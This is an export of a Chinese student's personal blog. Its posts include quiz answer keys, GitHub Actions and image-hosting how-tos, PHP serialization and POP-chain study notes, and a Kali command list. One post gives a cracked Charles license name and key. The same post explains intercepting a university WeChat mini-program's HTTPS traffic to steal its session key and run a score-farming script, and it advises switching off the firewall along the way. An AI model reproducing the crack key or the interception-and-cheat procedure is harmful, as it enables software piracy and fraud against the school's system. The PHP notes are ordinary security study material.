title="第9章"></a>第9章</h4><p>1-5:DBBDA<br>6-10:CBDDC<br>11:ABCDE<br>12-13:ABCD<br>14-16:ABCDE<br>17:ABC<br>18:ABCD<br>19:ABC<br>20-25:BBAAA<br>26-30:BABAA</p><h4 id="第10章"><a href="#第10章" class="headerlink" title="第10章"></a>第10章</h4><p>1-5:ACDCB<br>6-10:DDBBB<br>11:ABCDE<br>12:ABCD<br>13-14:ABCDE<br>15-16:ABCD<br>17:ABC<br>18:ABCD<br>19:ABC<br>20:BC<br>21-25:BBAAA<br>26-30:ABABA</p><h4 id="第11章（？）"><a href="#第11章（？）" class="headerlink" title="第11章（？）"></a>第11章（？）</h4><p>1-5:CCBAA<br>6-10:ACABC<br>11:ABC<br>12:ABCCD<br>13:ABCE<br>14:CDE<br>15-17:ABCD<br>18-19:ABCDE<br>20:ACE<br>21-25:AABAA<br>26-30:AAAAB</p><h3 id="不保证完全一致，极可能存在多套题组，请核对后再查看-1"><a href="#不保证完全一致，极可能存在多套题组，请核对后再查看-1" class="headerlink" title="不保证完全一致，极可能存在多套题组，请核对后再查看"></a>不保证完全一致，极可能存在多套题组，请核对后再查看</h3>]]></content>
      
      
      <categories>
          
          <category> 闲聊 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 闲聊 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Github Action初体验</title>
      <link href="/2023/02/02/20230202/"/>
      <url>/2023/02/02/20230202/</url>
      
        <content type="html"><![CDATA[<h3 id="Github-Action"><a href="#Github-Action" class="headerlink" title="Github Action"></a>Github Action</h3><p>今天小小地了解了一下Github Action这个东西<br>感觉它实际上就是一个轻量级服务器而已<br>用户每个月有限制内存和运行时间，但是基本上不用担心用完</p><p>Action可以选择很多模板，也可以自己设置定时任务。<br>文件是yaml类型，语法不难理解<br>尝试几次就成功把以前那个该死的经典诵读文件做成一个定时任务了。</p><p>感觉很好的是密钥的添加很方便，也很好管理<br>但是，还是要翻旧账批评它没有一键删除history这个功能</p><p>这个定时任务文件代码放在这里了，有需要的自己改了用吧</p><pre><code># This workflow will install Python dependencies, run tests and lint with a single version of Python# For more information see: https://docs.github.com/en/actions/automating-builds-and-tests/building-and-testing-pythonname: Python applicationon:  schedule:  # 定时任务，在每天的上午11点推送天气信息到邮箱    - cron: &#39;0 3 * * *&#39;    jobs:  build:    runs-on: ubuntu-latest    steps:    - uses: actions/checkout@v3    - name: Set up Python 3.10      uses: actions/setup-python@v3      with:        python-version: &quot;3.10&quot;            - name: Install dependencies      run: |        python -m pip install --upgrade pip        pip install flake8 pytest        pip3 install requests        if [ -f requirements.txt ]; then pip install -r requirements.txt; fi            - name: RunScripts      run: |        # stop the build if there are Python syntax errors or undefined names        python 程序.py        # exit-zero treats all errors as warnings. The GitHub editor is 127 chars wide</code></pre>]]></content>
      
      
      <categories>
          
          <category> 日报 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 日报 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>NoneBot2框架&amp;刷机小记</title>
      <link href="/2023/02/01/202301%E6%9C%88%E6%80%BB%E7%BB%93/"/>
      <url>/2023/02/01/202301%E6%9C%88%E6%80%BB%E7%BB%93/</url>
      
        <content type="html"><![CDATA[<p>半个月前，我一时兴起入坑QQbot，在go-cqhttp和nonebot2上接触到异步代码。<br>以及，在Python的异步代码里使用requests会堵塞这个问题。<br>自己写了点插件，也爬了很多api端口和网站。<br>本来想着在官网上也发布一个插件的，但是想想自己的臃肿的代码还是算了。<br><img src="https://s2.loli.net/2023/02/02/V57JDlnIgtaz2iq.png" alt="Bot长这样"><br><img src="https://s2.loli.net/2023/02/02/x8DAz94RnSQHZVJ.png" alt="查看服务器状态的插件"><br>近几天在玩刷机，拿个高通410的随身wifi刷了Debian。<br>超频到2.1GHz，同时释放了内存，现在它有这么大！<br><img src="https://s2.loli.net/2023/02/02/JeSaDVBqiMIc5yZ.png" alt="就问你离不离谱！"><br>你敢相信？他能跑上面所说的nonebot2<br>甚至能流畅运行1.8.8及更高版本的mc服务器！<br>今天下午试着用ZeroTier内网穿透，但是很可惜没做完。</p><p>由于17号要开学了，所以接下来还是多看看课本吧。<br>毕竟开学之后每周一从早八到晚上九点真的要命！！！</p>]]></content>
      
      
      <categories>
          
          <category> 闲聊 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 闲聊 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>新年快乐！</title>
      <link href="/2023/01/21/%E6%96%B0%E5%B9%B4%E5%BF%AB%E4%B9%90%EF%BC%81/"/>
      <url>/2023/01/21/%E6%96%B0%E5%B9%B4%E5%BF%AB%E4%B9%90%EF%BC%81/</url>
      
        <content type="html"><![CDATA[<p><img src="https://s2.loli.net/2023/01/20/1R8PjGN5Baq7dJW.jpg" alt="随便写点东西"><br><img src="https://s2.loli.net/2023/01/20/PJjSVf2ZcrsplF6.png" alt="随便放点喜欢的图"><br><img src="https://s2.loli.net/2023/01/20/5QgoSpuZj8tzY4H.jpg" alt="过年就要做喜欢的事"><br><img src="https://s2.loli.net/2023/01/20/ASsKZNOHUvQ1oh3.jpg" alt="开心就好呐"><br><img src="https://s2.loli.net/2023/01/20/cUhNVqupKTbSa57.png" alt="过去没达到的目标"><br><img src="https://s2.loli.net/2023/01/20/QPysl5H9gJKNMY3.png" alt="就让它留在过去吧"><br><img src="https://s2.loli.net/2023/01/20/T5jayCcslFYtbG7.jpg" alt="但是现在立下的目标"><br><img src="https://s2.loli.net/2023/01/20/sDyIUJd1zkepg5H.jpg" alt="一定要为它负责啊！"></p><h6 id="小事记"><a href="#小事记" class="headerlink" title="小事记"></a>小事记</h6><p>本来打算在春节之前写完一个CVE的漏洞复现，但是写了一半才发现已经被师兄抢了！！！<br>师兄你不讲武德，抢了所有任务里最简单的一个哈哈哈。<br>没办法只能写另外一个CVE了，但是由于不是很懂java和c，所以理解很困难。<br>看了一堆大佬的文章之后终于搞明白了，也磕磕绊绊地大概写了一个exp<br>最后看到只能自己搭建漏洞环境来测试，这下就真的顶不住了……<br>现在我不打算继续搭建了，毕竟这样子做出来的成本太高，效果很差不说，跟我现在接触的知识还有些脱节。</p><h6 id="每日一句"><a href="#每日一句" class="headerlink" title="每日一句"></a>每日一句</h6><p>世界有长久事物，便是安慰。</p>]]></content>
      
      
      <categories>
          
          <category> 随笔 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 随笔 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>有点意思~</title>
      <link href="/2023/01/12/20230112/"/>
      <url>/2023/01/12/20230112/</url>
      
        <content type="html"><![CDATA[<p><img src="https://s2.loli.net/2023/01/12/HxhJLnMmr7TvGIX.png" alt="真正值得纪念的，或许不止是一张画片"><br><img src="https://s2.loli.net/2023/01/13/1vqJb5eflmtMFIp.png" alt="你见证了她的努力，此时就再守护她一会吧"><br><img src="https://s2.loli.net/2023/01/13/sCdprRjVKS1Gz3X.png" alt="想找出“恋爱”的公式，或许还需要一段时间"><br><img src="https://s2.loli.net/2023/01/13/SHhNsIKOYijGLuz.png" alt="玫瑰的意义，只存在于你我心中"></p>]]></content>
      
      
      <categories>
          
          <category> 随笔 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 随笔 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>经典诵读的正确打开方式</title>
      <link href="/2023/01/07/20220107/"/>
      <url>/2023/01/07/20220107/</url>
      
        <content type="html"><![CDATA[<h3 id="每日一记"><a href="#每日一记" class="headerlink" title="每日一记"></a>每日一记</h3><p>今天是广州某大学的wx小程序研究资料。<br>既然来了，那么话不多说，直接上教程<br>首先下载安装必备的应用<br><em>关于Python的安装和环境配置就不在这里赘述了</em><br><strong><a href="https://blog.csdn.net/qq_45502336/article/details/109531599?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522167291320016800186585384%2522%252C%2522scm%2522%253A%252220140713.130102334.pc%255Fblog.%2522%257D&request_id=167291320016800186585384&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~blog~first_rank_ecpm_v1~rank_v31_ecpm-9-109531599-null-null.142%5Ev70%5Econtrol,201%5Ev4%5Eadd_ask&utm_term=python&spm=1018.2226.3001.4187">Python传送门</a></strong><br><strong>Charles</strong><br>1.前往<a href="https://www.charlesproxy.com/download/">官网</a>下载安装最新版本<br><img src="https://s2.loli.net/2023/01/07/m1S8RCupIAgQyP9.png" alt="随便选个喜欢的"><br>2.在下图处输入<strong>pojie</strong>和<strong>9d8fb452d26c0decc5</strong>后确定<br><img src="https://s2.loli.net/2023/01/07/ZzpSn2uRG8BgIoA.png" alt="恭喜你解锁VIP"><br>3.点击HEIP-&gt;SSLProxying-&gt;Install Charles Root Certificate配置证书<br>4.点击【安装】，点击【下一步】，然后选【放入下列存储】，然后是【受信任的根证书颁发机构】<br>5.点击【Proxy】–&gt;【SSL Proxying Settings…】<br>6.勾选【Enable SSL Proxying】点击【add】，在Host输入【*】，在Prot输入【443】最后点击【ok】保存</p><h5 id="接下来是抓包"><a href="#接下来是抓包" class="headerlink" title="接下来是抓包"></a>接下来是抓包</h5><p>1.关闭防火墙:打开网络设置&gt;高级网络设置&gt;Windows防火墙&gt;公用网络&gt;关闭并确认<br>2.在PC端wx中打开该小程序<br>3.在任务管理器里找到该小程序的应用<br><img src="https://s2.loli.net/2023/01/07/meVHGjo6vDNUScL.png" alt="找到这个万恶之源！"><br>4.右键点开小程序，打开文件所在位置，找到一个叫Runtime的包<br>5.将小程序和微信都关闭掉（否则部分文件删除不掉），然后将Runtime包下的文件都删除掉<br>6.把Runtime文件夹改为只读状态<br><img src="https://s2.loli.net/2023/01/07/YtoPvDxO6Z8unwa.png" alt="就是这个"><br>7.重新进入该wx小程序登录<br>8.打开Charles后在小程序内随意进入一个页面<br>9.CTRL+F输入<strong>key</strong>找到并复制字段<br><img src="https://s2.loli.net/2023/01/07/ruwzPXvIG7AWCNB.png" alt="就类似于这样，不能放得更多了"></p><h5 id="最后开始让代码跑起来"><a href="#最后开始让代码跑起来" class="headerlink" title="最后开始让代码跑起来"></a>最后开始让代码跑起来</h5><p>在主程序的这个位置粘贴刚刚复制的key并运行<br><img src="https://s2.loli.net/2023/01/07/tSf9DFdlPKWLBbs.png" alt="报错没有库的自己装"></p><h4 id="这就结束了？当然不！"><a href="#这就结束了？当然不！" class="headerlink" title="这就结束了？当然不！"></a>这就结束了？当然不！</h4><h5 id="接下来是移动端部分"><a href="#接下来是移动端部分" class="headerlink" title="接下来是移动端部分"></a>接下来是移动端部分</h5><p>1.打开<a href="https://pan.baidu.com/s/1ff-HmcwQSz8cHGqgpMJrcw">百度网盘</a>链接下载安装pydriod，提取码:de5q<br>2.打开保存在手机里的主程序文件并填入key<br>3.左栏Pip中选择INSTALL，分别输入requests,json,random,urllib,time并INSTALL<br>4.左栏Settings的Editor选项内打开Preserve files on exit<br>5.点击大大的黄色的运行按钮</p><p>注:<br>如果运行时发生错误请检查网络或尝试重启<br>如果出现名字不显示或者各种奇奇怪怪的bug但确确实实在运行，那么看着就好(正所谓能跑就行)<br>如果显示<strong>得分失败，重新开始匹配</strong>就多等一会，因为没有真人跟你匹配是不会得分的<br>本章内容只对该小程序进行分析，仅限学习研究使用，严禁进行其他非法行为！造成的后果本人不承担相关责任。<br>严禁任何人以任何形式传播此文章相关内容，否则本人不承担任何责任。</p><p><em><strong>最后感谢该校各位前辈的指导和帮助！！！</strong></em></p><h3 id="每日一句"><a href="#每日一句" class="headerlink" title="每日一句"></a>每日一句</h3><p><strong>每个烟花都像是盲盒，不知道点燃升空之后会是什么颜色、什么形状、会持续多久。</strong></p>]]></content>
      
      
      <categories>
          
          <category> 日报 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 日报 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Midjourney</title>
      <link href="/2023/01/06/20220106/"/>
      <url>/2023/01/06/20220106/</url>
      
        <content type="html"><![CDATA[<h5 id="无聊玩了一下Midjourney，挺方便，功能也很强大"><a href="#无聊玩了一下Midjourney，挺方便，功能也很强大" class="headerlink" title="无聊玩了一下Midjourney，挺方便，功能也很强大"></a>无聊玩了一下Midjourney，挺方便，功能也很强大</h5><p><img src="https://s2.loli.net/2023/01/06/vBlOqfjzJATF2kG.png#pic_center" alt="荒星"><br><img src="https://s2.loli.net/2023/01/07/uTWD6a93ZHOlxLq.png#pic_center" alt="好像刀妹"><br><img src="https://s2.loli.net/2023/01/06/X1FeICpcr74lkL9.png#pic_center" alt="粉毛YYDS"></p><h5 id="最后放个邀请地址"><a href="#最后放个邀请地址" class="headerlink" title="最后放个邀请地址"></a>最后放个<a href="https://discord.com/invite/midjourney">邀请地址</a></h5>]]></content>
      
      
      <categories>
          
          <category> 随笔 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 随笔 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Hentai</title>
      <link href="/2023/01/05/20220105/"/>
      <url>/2023/01/05/20220105/</url>
      
        <content type="html"><![CDATA[<h5 id="能找到这里的都是Hentai"><a href="#能找到这里的都是Hentai" class="headerlink" title="能找到这里的都是Hentai"></a>能找到这里的都是<a href="https://track.mp3-malina.me/play-track/d33532303034b6303534368cb734823000/ff34543f34e2aa427c7b17347be4cc40/S3rl%20-%20Hentai.mp3">Hentai</a></h5>]]></content>
      
      
      <categories>
          
          <category> 资源 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 资源 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>图床及其相关</title>
      <link href="/2023/01/04/20220104/"/>
      <url>/2023/01/04/20220104/</url>
      
        <content type="html"><![CDATA[<h3 id="每日一记"><a href="#每日一记" class="headerlink" title="每日一记"></a>每日一记</h3><h5 id="图床的创建"><a href="#图床的创建" class="headerlink" title="图床的创建"></a>图床的创建</h5><p>市面上免费的图床有SM.MS&emsp;Sibnet&emsp; Shutterfly<br>不完全免费的也有腾讯云&emsp; 阿里云&emsp; 七牛云<br>这里我把阿里云和SM.MS都试了一下</p><p>创建的话就跟着下面的步骤走就行了:<br>一.阿里云<br>&emsp;1.打开<a href="https://www.aliyun.com/?spm=5176.8466032.top-nav.dlogo.27b81450NiIk8F">官网</a>点击右上角进行注册/登录<br>&emsp;2.实名认证<br>&emsp;3.在左上角折叠页面里选择对象存储OSS<br>&emsp;4.右侧Bucket管理板块点击添加Bucket<br>&emsp;5.名称填写Bucket的名字，读写权限更改为公共读，其他的默认即可<br>&emsp;6.创建完成之后鼠标移至右上角头像上，选择AccessKey管理<br>&emsp;7.查看Secret并分别复制两行ID<br>&emsp;8.前往<a href="https://github.com/Molunerfinn/PicGo/releases">PicGo下载页面</a>选择对应版本下载安装<br>&emsp;9.打开PicGo图床设置的阿里云页面填写相关资料<br>&emsp;10.上传区选择格式就能使用了<br>二.SM.MS<br>&emsp;1.<a href="https://smms.app/">官网注册/登录</a><br>&emsp;2.复制<a href="https://smms.app/home/apitoken">此页面</a>的Secret Token<br>&emsp;3.在<a href="https://smms.app/">此页面</a>上传文件<br>&emsp;4.打开PicGo的SM.MS页面粘贴Secret Token<br>&emsp;5.上传区选择格式就能使用了</p><p>注:<br>1.我在使用PicGo链接SM.MS时总是失败，不知道为啥<br>2.因为阿里云不是免费的，想省钱可以选择香港<br>3.一定要设置<a href="https://help.aliyun.com/document_detail/31869.html?spm=5176.8466032.bucket.28.27b81450rEXDcJ">防盗链</a></p><h5 id="图床在markdown中的使用"><a href="#图床在markdown中的使用" class="headerlink" title="图床在markdown中的使用"></a>图床在markdown中的使用</h5><p>方法一:使用img标签</p><pre><code> &lt;img src=&quot;图片地址&quot;&gt;</code></pre><p>方法二:md语法</p><pre><code> ![图片简介](图片地址)</code></pre><h5 id="更改图片参数"><a href="#更改图片参数" class="headerlink" title="更改图片参数"></a>更改图片参数</h5><pre><code>使用html更改位置&lt;center&gt;&lt;img src=&quot;地址&quot;&gt;&lt;/center&gt;居中对齐操作：#pic_center向左对齐操作：#pic_left向右对齐操作：#pic_right想调整图片的尺寸就在上面这个指令后面加上=200x200(=200x宽高自适应)width=&quot;100&quot;调整大小</code></pre><p>今天的内容就这么多，下次有空再继续写。</p><h3 id="每日一句"><a href="#每日一句" class="headerlink" title="每日一句"></a>每日一句</h3><p><strong>眼下的生活，不是没有快乐。只是所有快乐都暗含着一层谨慎的底色。</strong></p>]]></content>
      
      
      <categories>
          
          <category> 日报 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 日报 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>2022年度总结</title>
      <link href="/2022/12/31/2022%E5%B9%B4%E5%BA%A6%E6%80%BB%E7%BB%93/"/>
      <url>/2022/12/31/2022%E5%B9%B4%E5%BA%A6%E6%80%BB%E7%BB%93/</url>
      
        <content type="html"><![CDATA[<h4 id="呆"><a href="#呆" class="headerlink" title="呆~"></a>呆~</h4><p>  简直突如其来呐。<br>  万万没想到一个月就过去了，时间过得真快啊。</p><p>  在2022年的抗疫决赛圈，几乎所有人都成了小阳人，其中也包括我。<br>  发烧第一天真的是给我吓到了，中午一觉起来高烧42.5℃，惊恐之余赶紧撑着摇摇欲坠的身体去买布洛芬(似乎我这个城市退烧药还算充足？)到晚上睡前才降到39℃。看到那个长度我真的是笑希了，感觉39℃也不过是小问题……<br>  (⁄ ⁄•⁄ω⁄•⁄ ⁄)<br>  感谢芙灵和一个现在被迫带烧返校的可怜的江苏高三Dog!<br>  现在病情已经到了欲说还休的阶段了，因此被鹅鸭杀劝退<del>，因此才能闲到来写这个文章</del><br>  希望早日康复吧，我还想吃正新鸡排</p><p>  这个小小站点活过了第一个国庆，第一个圣诞，马上就是元旦和春节了，希望这里能永远保存下去。<br>  最近了解了GitHub Arctic Code Vault这个东东，虽然说想得到这个可能有点不现实，但是可以把它当作理想吧。<br>  (づ ●─● )づ</p><p>  对于2023年的规划没有太多的变化，仍然是多学习，多看世界，多保重身体。<br>  人生刚刚开始，未来可期。<br>  犹豫不决的时候不要问别人，问自己。听别人的如果后悔了，是要后悔两次的。</p><p>  最后，元旦快乐~</p><p>  乾杯 []~ （￣▽￣） ~*</p><h5 id="20230104补档"><a href="#20230104补档" class="headerlink" title="20230104补档"></a>20230104补档</h5><p>  <strong>试验阿里云+PicGo图床</strong><br>   <img src="https://liuguobin-blog.oss-cn-hongkong.aliyuncs.com/base.png#pic_center" width="300"></p>]]></content>
      
      
      <categories>
          
          <category> 随笔 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 随笔 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>PHP序列化及常见魔术方法</title>
      <link href="/2022/12/04/20221204/"/>
      <url>/2022/12/04/20221204/</url>
      
        <content type="html"><![CDATA[<h3 id="每日一记"><a href="#每日一记" class="headerlink" title="每日一记"></a>每日一记</h3><h4 id="序列化"><a href="#序列化" class="headerlink" title="序列化"></a>序列化</h4><pre><code>【数组序列化】&lt;?php$a=null;echo serialize($a);?&gt;a:参数数量:&#123;i:0;s:字符串长度:&quot;字符串&quot;;&#125;$a=null;         N;$b=123456;       i:123456;$c=1.2;          d:1.2;$d=true;         b:1;$e=false;        b:0;$f=&#39;benben&#39;;     s:长度:字符串;【对象序列化】&lt;?phpclass lei&#123;    public $chengyuan=&#39;zifuchuan&#39;;    function hanshu()&#123;        echo $this-&gt;chengyuan;    &#125;&#125;$a=new lei();echo serialize($a);echo urlencode(serialize($a));?&gt;O:类名长度:&quot;类名&quot;:1:&#123;s:成员长度:&quot;成员名&quot;;s:值长度:&quot;值&quot;;&#125;修饰符public公有，private私有私有的成员属性要在前后都加上二进制的%00,在urlencode时可以看见【对象序列化的嵌套】&lt;?phpclass test&#123;    public $pub=&#39;benben&#39;;    function jineng()&#123;        echo $this-&gt;pub;    &#125;&#125;class test2&#123;    var $ben;&#125;$b=new test();$a=new test2();$a-&gt;ben=$b;echo serialize($a);?&gt;O:5:&quot;test2&quot;:1:&#123;s:3:&quot;ben&quot;;O:4:&quot;test&quot;:1:&#123;s:3:&quot;pub&quot;;s:6:&quot;benben&quot;;&#125;&#125;当在对象内调用对象时，会出现嵌套:实例化后的对象$a的成员变量&#39;ben&#39;调用实例化后的对象$b</code></pre><h4 id="反序列化"><a href="#反序列化" class="headerlink" title="反序列化"></a>反序列化</h4><p>1.反序列化后的内容为一个对象，与序列化相反<br>2.反序列化生成的对象内的值，由反序列化里的值提供，与原有类预定义的值无关<br>3.反序列化不触发类的成员方法，需要调用方法之后才能触发</p><pre><code>&lt;?phpclass test&#123;    public $a=&#39;benben&#39;;    protected $b=666;    private $c=false;    public function displayVar()&#123;        echo $this-&gt;a;    &#125;&#125;$d=new test();$d=serialize($d);echo urlencode($d);$a=urlencode($d);$b=unserialize(urldecode($a));$b-&gt;displayVar();var_dump($b);?&gt;benbenobject(test)#1 (3) &#123;  [&quot;a&quot;]=&gt;  string(6) &quot;benben&quot;  [&quot;b&quot;:protected]=&gt;  int(666)  [&quot;c&quot;:&quot;test&quot;:private]=&gt;  bool(false)&#125;</code></pre><h4 id="魔术方法"><a href="#魔术方法" class="headerlink" title="魔术方法"></a>魔术方法</h4><p>概念:<br>预定好的，在特定的情况下处罚的行为方法。<br>反序列化成因(作用):<br>反序列化过程中unserizlize()接收的值(字符串)可控；<br>通过更改这个值(字符串)，所得到的代码；<br>通过调用方法，触发代码执行。<br>相关机制:<br>触发时机(先决条件)-&gt;功能(最重要)-&gt;参数(尤其是pop链)-&gt;返回值<br>详解:</p><pre><code>1.__construct()构造函数在实例化对象时，自动执行的方法只有当new时触发，不需要特地调用2.__destruct()析构函数在对象的所有引用都被删除或者对象被显式销毁时才触发new和unserialize之后会触发3.__sleep()清理对象可以传入成员属性，serialize之前触发并返回一个包含对象中所有需要被序列化的变量名称的数组如果无返回则NULL被序列化，产生E_NOTICE错误4.__wakeup()预先准备对象资源，返回void在unserialize前触发5.__tostring()表达方式错误把对象当成字符串调用时触发，如echo，print6.__invoke()格式表达错误把对象当成函数调用时触发，如echo $a() -&gt; hanshu7.__call()不存在方法不存在调用的方法时触发8.__callStatic()不存在方法静态调用或调用成员常量不存在时使用9.__get()不存在方法检查成员属性是否存在10.__set()不存在方法给不存在的成员属性赋值时触发11.__isset()或__empty()或__unset()不可访问对不可访问的属性访问时会触发如protect属性(不可读)或根本不存在的属性12.__clone()复制使用clone关键字拷贝完成一个对象后，新对象会自动调用定义的魔术方法__clone()</code></pre><p>注意:<br>1.只有该类或对象包含了该魔术方法才能被使用或触发<br>2.先分析尾部代码看看有什么执行的步骤<br>3.接着从触发的方法及其顺序判断漏洞的利用地点<br>4.最后构造playload<br>5.比较长的代码建议使用反推法进行分析<br>6.一定要先实例化(new)</p><h4 id="POP链"><a href="#POP链" class="headerlink" title="POP链"></a>POP链</h4><p>反序列化中成员变量可以被控制，使用有一种漏洞叫面向属性编程(POP)<br>POP链是利用魔术方法在里面多次跳转然后获取敏感信息的一种playload</p><h4 id="POC编写"><a href="#POC编写" class="headerlink" title="POC编写"></a>POC编写</h4><p>概念验证(POC)是漏洞验证程序，只是为了证明提出者观点的一段代码</p>]]></content>
      
      
      <categories>
          
          <category> 日报 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 日报 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>20221202</title>
      <link href="/2022/12/02/20221202/"/>
      <url>/2022/12/02/20221202/</url>
      
        <content type="html"><![CDATA[<h3 id="每日一记"><a href="#每日一记" class="headerlink" title="每日一记"></a>每日一记</h3><h4 id="Git"><a href="#Git" class="headerlink" title="Git"></a>Git</h4>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>20221202</title>
      <link href="/2022/12/02/20221202/"/>
      <url>/2022/12/02/20221202/</url>
      
        <content type="html"><![CDATA[]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>小声比比</title>
      <link href="/2022/12/01/20221201%E6%9C%88%E7%BB%93/"/>
      <url>/2022/12/01/20221201%E6%9C%88%E7%BB%93/</url>
      
        <content type="html"><![CDATA[<h5 id="又是一个月，该总结一下了"><a href="#又是一个月，该总结一下了" class="headerlink" title="又是一个月，该总结一下了"></a>又是一个月，该总结一下了</h5><p>  首先还是这个月干了啥。<br>  好像也没干啥？？？<br>  学了JS，PHP，数据库，一点点命令，还有算是课内知识的python爬虫<br>  虽然看着学了很多，但是基础并不牢固。<br>  因此<br>  我可能将要用至少一个月的时间来消化从建站到现在所学的内容<br>  毕竟…<br>  高数和现代终究是大头，还有一个计导虎视眈眈</p><p>  接着来说说接下来一个月的计划吧~<br>  首先，既然是在家上网课<br>  当然是要<br>  <del>吃了就睡，睡了就吃，跟个死猪一样</del><br>  <em><strong>好好学习，天天向上</strong></em></p><h5 id="鸭梨山大"><a href="#鸭梨山大" class="headerlink" title="鸭梨山大"></a>鸭梨山大</h5><p>  其实在这个月的学习中我的感触很深，网络安全绝不是一朝一夕可以完成的(屁话)<br>  现在所学的全部这些内容可以说都是前置知识的一部分<br>  包括在平时练习的CTF，都是走向安全的一段路<br>  那么，既然如此<br>  我更应该将重心放在基础上，而非一味的追求解题量<br>  甚至是成为众人最不屑的“赛棍”。</p><h5 id="还有啥好讲的？"><a href="#还有啥好讲的？" class="headerlink" title="还有啥好讲的？"></a>还有啥好讲的？</h5><p>  既然这是一篇发布在博客的文章，那就再聊聊博客的事吧<br>  首先是最令我头疼的事——主页解析的视频老是失效。真的是脑阔疼，我找了很久了，但是一直没有解决方法，如果有人有方法或是突发奇想请在GitHub上评论，十分感谢！！！<br>  然后是关于加载速度有些缓慢甚至是在网不好的情况下出现白屏的问题(响应速度还是蛮快的，并没有发生许多人所说的被墙的情况，尽管是在校园网的情况下)，是因为主页启用了过多插件的缘故，在一段时间后(可能年后有空时)，会对这个blog进行一次大修改，争取加载时间缩短到1000毫秒内吧。<br>  最后，还是重复说明一下。这个博客虽然是public的，但是我只希望它的作用只是个刻录我在大学四年或更久的时光里的里程碑。时不时记录下成长经历，时不时写点随笔，时不时慷慨地发点自己总结的知识梳理，方便我自己和其他来到这里的 <em><strong>朋友们</strong></em> 学习。</p><h5 id="好了，最后还是一句"><a href="#好了，最后还是一句" class="headerlink" title="好了，最后还是一句"></a>好了，最后还是一句</h5><p><strong>人，活的不是一个点，人活起伏。</strong><br>说人话版:是个三维的东西就不要天天像个二维的玩意一样躺平~</p>]]></content>
      
      
      <categories>
          
          <category> 随笔 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 随笔 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Kali常用命令</title>
      <link href="/2022/11/21/Kali%E5%91%BD%E4%BB%A4/"/>
      <url>/2022/11/21/Kali%E5%91%BD%E4%BB%A4/</url>
      
        <content type="html"><![CDATA[<h1 id="kali的常用命令"><a href="#kali的常用命令" class="headerlink" title="kali的常用命令"></a>kali的常用命令</h1><h3 id="1-基础命令"><a href="#1-基础命令" class="headerlink" title="1.基础命令"></a>1.基础命令</h3><pre><code>passwd 修改密码passwd root 修改root用户密码date 显示系统日期sudo 后面加命令 就可以调用管理权限apt-get update 更新软件列表访问源列表里的每个网址，并读取软件列表，然后保存在本地电脑。我们在新立得软件包管理器里看到的软件列表，都是通过update命令更新的。apt-get upgrade 更新软件把本地已安装的软件，与刚下载的软件列表里对应软件进行对比，如果发现已安装的软件版本太低，就会提示你更新。apt-get dist-upgrade 更新软件  --+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--【apt-get upgrade 与 apt-get dist-upgrade 的区别】upgrade:系统将现有的Package升级,如果有相依性的问题,而此相依性需要安装其它新的Package或影响到其它Package的相依性时,此Package就不会被升级,会保留下来.dist-upgrade:如果有相依性问题,需要安装/移除新的Package,就会试着去安装/移除它.(所以通常这个会被认为是有点风险的升级)apt-get upgrade 和 apt-get dist-upgrade 本质上是没有什么不同的，只不过dist-upgrade会识别出当依赖关系改变的情形并作出处理，而upgrade对此情形不处理。例如软件包 a 原先依赖 b c d，但是在源里面可能已经升级了，现在是 a 依赖 b c e。这种情况下，dist-upgrade 会删除 d 安装 e，并把 a 软件包升级，而 upgrade 会认为依赖关系改变而拒绝升级 a软件包。--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--clear 清屏sudo gpedit 特权调用gpedit编辑器reboot 重启apt-get install XXXXX 安装缺少的依赖包，（XXX）里面输入缺少依赖包的名字apt-get autoremove –purge 软件名 删除包及其依赖的软件包+配置文件等apt-get install +模块名 这种方法也可以安装模块,或者apt-get install python-模块名firefox 浏览器打开shutdown -h now 关闭系统(1)init 0 关闭系统(2)telinit 0 关闭系统(3)shutdown -h hours:minutes &amp; 按预定时间关闭系统shutdown -c 取消按预定时间关闭系统shutdown -r now 重启(1)reboot 重启(2)su -l 切换登陆用户logout 注销用户登陆pwd 当前路径</code></pre><h3 id="2-文件夹或文本操作"><a href="#2-文件夹或文本操作" class="headerlink" title="2.文件夹或文本操作"></a>2.文件夹或文本操作</h3><pre><code>cd .. 返回上一级目录cd ../.. 返回上级两级目录cd - 返回上次所在的目录cd 文件夹名  进去文件夹cd ~ 进去当前用户主目录pwd 显示当前工作路径touch 文件名  常见文件cat 文件名 读取文档内容mkdir 文件名 创建文件夹mkdir -p 文件夹 递归创建文件夹cp 复制命令cp -r moon moons 复制moon 文件夹到当前 moons 如果有里面有文件 使用-r mv 移动命令mv moon moons 也可以说是改名mkdir 文件名 文件名 创建多个文件夹ls 显示文件和文件夹名ls -a 显示所有的文件和文件夹 包含隐藏文件ls -l 显示文件和目录的详细资料rm -f 文件  删除文件rm 文件夹名 删除文件夹rm -rf  文件/文件夹  删除文件夹 及其目录下的文件bzip2 